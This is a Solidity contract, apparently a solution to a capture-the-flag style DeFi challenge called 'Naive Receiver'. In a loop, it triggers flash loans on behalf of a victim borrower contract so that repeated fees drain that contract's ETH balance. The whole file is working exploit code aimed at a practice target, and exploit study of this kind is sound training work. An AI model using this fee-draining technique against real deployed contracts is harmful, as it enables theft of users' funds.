// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack is IERC3156FlashBorrower {
    IERC3156FlashLender public lender;
    IERC3156FlashBorrower public receiver;

    uint public repayAmount;

    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(IERC3156FlashLender _lender, IERC3156FlashBorrower _receiver) {
        lender = _lender;
        receiver = _receiver;
    }

    receive() external payable {
        if (msg.sender != address(lender)) {
            return;
        }
        while (address(receiver).balance > 0) {
            lender.flashLoan(receiver, ETH, 1 ether, "0x");
        }
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        // Return funds to pool
        SafeTransferLib.safeTransferETH(address(lender), 1 ether);
        repayAmount = amount + fee;

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
